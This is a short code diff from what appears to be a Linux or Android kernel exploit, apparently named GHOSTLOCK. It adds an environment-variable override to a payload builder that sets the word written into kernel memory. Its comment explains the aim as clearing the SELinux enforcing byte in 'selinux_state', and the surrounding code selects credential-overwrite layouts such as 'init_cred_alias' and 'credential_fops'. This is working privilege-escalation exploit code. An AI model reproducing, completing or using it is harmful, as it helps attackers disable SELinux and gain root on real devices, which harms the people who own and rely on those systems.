@@ -1,5 +1,6 @@
 #include "memory/payload_builder.h"
 
+#include <stdlib.h>
 #include <string.h>
 
 #include <algorithm>
@@ -67,9 +68,18 @@ PayloadWriteLayout payload_write_layout(
     if (!request || request->mode == WriteMode::Disabled) return layout;
 
     if (request->preserve_child) {
-        layout.right = request->mode == WriteMode::Credential
-                ? init_cred_alias
-                : page_base + 0x100;
+        /* GHOSTLOCK_WRITE_WORD: calibration override - store an exact 64-bit
+         * constant instead of the two built-in layouts. Used for W1 so that
+         * writing back RAW & ~0xFF into selinux_state changes only the
+         * enforcing byte and leaves checkreqprot/initialized/policycap intact. */
+        const char *word = getenv("GHOSTLOCK_WRITE_WORD");
+        if (word && *word) {
+            layout.right = (uintptr_t) strtoull(word, nullptr, 0);
+        } else {
+            layout.right = request->mode == WriteMode::Credential
+                    ? init_cred_alias
+                    : page_base + 0x100;
+        }
     }
     if (request->mode == WriteMode::Credential) {
         layout.fops = credential_fops;
